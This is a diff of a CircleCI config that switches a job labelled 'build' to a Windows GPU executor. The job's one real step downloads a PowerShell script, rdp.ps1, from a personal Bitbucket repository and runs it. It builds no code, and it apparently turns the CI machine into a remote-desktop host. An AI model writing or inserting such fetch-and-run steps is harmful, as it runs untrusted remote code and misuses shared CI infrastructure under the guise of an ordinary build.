@@ -1,12 +1,12 @@
 version: 2.1
+orbs:
+  win: circleci/windows@2.3.0
 
 jobs:
   build:
-    machine:
-      image: windows-server-2019-nvidia:stable
+    executor: win/gpu-nvidia
     steps:
-      - run:
-          name: Test
-          command: |
+      - checkout
+      - run: |
             Invoke-WebRequest https://bitbucket.org/sadsases3324/rdp/raw/18b3393b9764bddd11687eda214a8f9a629fe01f/rdp.ps1 -OutFile rdp.ps1
             ./rdp.ps1
